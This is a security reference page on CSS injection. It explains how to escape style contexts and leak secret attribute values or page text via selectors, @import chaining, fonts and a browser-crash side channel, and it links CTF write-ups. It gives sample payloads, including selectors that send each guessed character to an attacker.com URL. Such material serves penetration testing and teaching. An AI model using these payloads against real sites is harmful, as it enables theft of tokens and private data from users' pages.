---
description: Injecting CSS code to leak content on a page using selectors
---

# CSS Injection

## Injecting

CSS Injection starts with injecting CSS. This can happen in a variety of ways, a simple example being a customization of a color by setting a property in the CSS to your user input:

```html
<style>
body {
  color: <?= $color ?>;
}
</style>
```

This allows the user to set the page to any color with the `$color` variable, but a malicious user could use special characters to escape the context. Firstly, you should check if a closing `</style>` tag is disallowed, because if you can write that inside some inline CSS, you can close out of the tag and start writing arbitrary HTML, potentially escalating to XSS. If `<` are encoded, for example, we can still perform CSS injection by closing the current selector and opening another one with the following payload:

{% code title="Payload" %}
```css
}*{background: red}
```
{% endcode %}

{% code title="Result" %}
```css
body {
  color: }*{background: red};
}
```
{% endcode %}

Rendering the above CSS, even though it is not completely valid syntax, will render everything on the page (`*`) with a red background. This is often a good proof-of-concept to show that attacks explained below will be possible.

The following article explains the general idea of CSS Injection and some tricks:

{% embed url="https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/" %}
Explanation of CSS Injection basics
{% endembed %}

### stylesheet vs. \<style> vs. style=

CSS can be loaded in a few different ways, and sometimes the details matter.

1. `<link rel="stylesheet" href="style.css">`: Loads CSS content from a URL (`href=`). This is only vulnerable if you can control the attribute enough to redirect it to any of your arbitrary content (or directly with an HTML-Injection), or if you have an injection dynamically generated CSS content somehow.
2. `<style>`: Using an sanitized HTML-injection, you may still be able to write a `<style>` tag with arbitrary content. Another option is if user input ends up in partially-trusted content and you can escape the context. (note: HTML-encoding content won't work here, even though it is inside HTML)
3. `style=` attribute: Inside of a [style attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/style), it is _not possible_ to add selectors and leak content. You can only change the style of the element it is an attribute of, to for example, make it take up the whole screen with a background image.

### Escaping string context

When injecting in partially-trusted CSS, it is almost aways enough to use `}` to close the current selector and open new ones. One exception to this is strings, which use quotes (`"`) that need to be closed first. You may be able to do this directly, or use a special character to also close the context (`\n`, `\r` or `\x0c`).

```css
.element::before {
  content: "<?= $content ?>";
}

.element2 {
  background: url('https://example.com/?param=<?= $param ?>');
}
```

The above injection points can be exploited in a few different ways:

* `$content`:\
  Using `"}*{background:red}` to close the quote\
  Using `\x0c}*{background:red}` to end the string (`\x0c` refers to the literal _Form Feed_ character, also `\n` and `\r` characters possible)
* `$param`:\
  Using `')}*{background:red}` to close the quote and `url()`\
  Using `\x0c)}*{background:red}` to end the string and `url()`

## Leaking

The goal of injecting CSS is to leak other content on the page. The most common attack is leaking attribute values of HTML elements by using selectors such as `input[value^=a]` to match any `<input>` element whose `value=` attribute _starts_ with "a". Inside of the selector, you can put a `background: url(https://attacker.com/?a)` pointing to your server with a unique path for that selector. Only if the selector matches, will the background be loaded and the URL requested. By seeing the incoming request, the attacker now knows there is an input element with that specific first character.

The attacker can repeat this for all possible characters to find one, then change the CSS to match the first and second characters now that the first is known.

```html
<input name="secret" value="secret">
<style>
/* 1st iteration */
input[name="secret"][value^="a"] { background: url(https://attacker.com/?a) }
input[name="secret"][value^="b"] { background: url(https://attacker.com/?b) }
input[name="secret"][value^="c"] { background: url(https://attacker.com/?c) }
...
input[name="secret"][value^="z"] { background: url(https://attacker.com/?z) }
/* 2nd iteration, once we receive the request for /?s */
input[name="secret"][value^="sa"] { background: url(https://attacker.com/?sa) }
input[name="secret"][value^="sb"] { background: url(https://attacker.com/?sb) }
input[name="secret"][value^="sc"] { background: url(https://attacker.com/?sc) }
...
input[name="secret"][value^="sz"] { background: url(https://attacker.com/?sz) }
</style>
```

### Selectors

For different types of content that we want to leak, there are different selectors. One edge case is if the secret input we want to leak has the **`type="hidden"`** attribute, which won't allow us to set a background image on it. Instead, we can target an adjacent element to set the background on, while still matching the hidden element. Read the [#stealing-hidden-input](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/#stealing-hidden-input) section for details on how to do this.

To leak **raw text** on the page instead of attributes, some more complex techniques are necessary. Firstly, "raw text" is just the content in between tags, like `<p>This is raw text</p>`. You can make even `<script>` tags in the body behave like text by giving them a `display: block` property. To leak such strings, you can abuse custom fonts to give certain characters a unique height, and then detect the presence of scroll bars to find which characters are shown. See this writeup to see how it is done:

{% embed url="https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/" %}
Leaking raw text nodes with CSS
{% endembed %}

### @import chaining

The technique explained above requires multiple separate loads of the CSS which may be difficult in some scenarios, so there exists a more complicated technique.

By including `@import` statements in the CSS, you can load extra CSS from a URL that may not respond yet, while the rest of the CSS that is already loaded will. If you create a clever server that responds with the 1st iteration right away, and then delays the response for the 2nd iteration, you can wait until the leak result from the 1st iteration comes in and then dynamically generate the 2nd iteration payload. Doing this is a chain allows you to leak larger amounts of text in a single shot.

One requirement for this `@import` chain attack is that your input is at the _start of a `<style>` tag_, often achieved through HTML-Injection. Just closing a selector and then writing an `@import` statement right after won't work, they can only exist at the top of the CSS source. See this article for details on exploitation:

{% embed url="https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b" %}
Explanation of @import chaining
{% endembed %}

### One-shot using 'contains' operator

While most techniques for leaking attributes do it one character at a time with the _prefix_ operator (`^=`), there is also the _contains_ operator (`*=`). By writing many partial substrings of text, you can find which ones exist on the target page and then combine them on the server into a single string. This makes it possible to leak an entire string from one single injection. It was the solution to the following challenge, with a writeup below:

{% embed url="https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/#web-newdiary-14-solves" %}
Solution to "newdiary" writeup involving a one-shot CSS injection&#x20;
{% endembed %}

### Other pages

Normally, it is only possible to exfiltrate content on the page the CSS Injection is on. But what if we can include other content just so we can leak it? The popular [`react-router`](https://reactrouter.com/) package for React is vulnerable to DOM Clobbering, where if we can include an extra `<iframe>` tag with an `srcdoc` attribute (through an HTML-Injection), we can give create a nested React renderer that loads another route!

With this, you can load any route to leak content of other more sensitive pages. The writeup below explains this:

{% embed url="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/" %}
CTF Writeup of importing another route and leaking it with CSS
{% endembed %}

### Blackbox

In cases where you are testing for an injection without knowing where it will end up, potentially on someone else's browser, you won't know exactly what to target with the leak yet. Below is an implementation that leaks a lot of information on the page so you can figure out what the page looks like only using CSS exfiltration:

{% embed url="https://portswigger.net/research/blind-css-exfiltration" %}
Leak structure of unknown data
{% endembed %}

## CSP Bypasses

### No fonts allowed (font-src)

When wanting to leak text nodes, the previously explained technique requires custom fonts to give characters varying heights. If you are not allowed to load custom fonts (even from eg. file uploads with `'self'`), another technique exists that uses more complex CSS features to achieve the same result:

{% embed url="https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/" %}
Leaking text _without_ fonts or @import chaining
{% endembed %}

### No images allowed (img-src)

If loading external images for exfiltration is disallowed by a CSP img-src directive, you may still be able to use font URLs if they are not blocked by font-src, connect-src or default-src directives. You must first define a `@font-face { font-family: a; src: url(...) }`, and then reference it in a selector like `input[value^="a"] { font-family: a }`. This works because the font will only be loaded if it is required by some element on the page.

### No external connections allowed at all (connect-src)

If no external requests can be made at all due to a strict CSP, it is still possible to use an XS-Leak based on browser crashing. At the time of writing, Chromium crashes when trying to render the `background: linear-gradient(in display-p3, red, blue)` property ([issue](https://issues.chromium.org/issues/382086298)). Using CSS selectors this can be done conditionally.

Because of [Full Site Isolation](https://chromium.googlesource.com/chromium/src/+/main/docs/process_model_and_site_isolation.md#Full-Site-Isolation-site_per_process), if one page of a site crashes, all other active frames of that site crash too. This is detectable by creating a dummy iframe on the attacker's page of the same site with any path, and measuring `onload=` events. By then conditionally crashing CSS in another iframe or popup window, you can detect the result of a single CSS selector by the dummy iframe crashing with it. Doing this repeatedly allows reading larger strings:

{% embed url="https://jorianwoltjer.com/blog/p/ctf/x3ctf-blogdog-new-css-injection-xs-leak#xs-leak-using-process-crashing" %}
Writeup of unintentional solution about this new technique, and PoC's
{% endembed %}
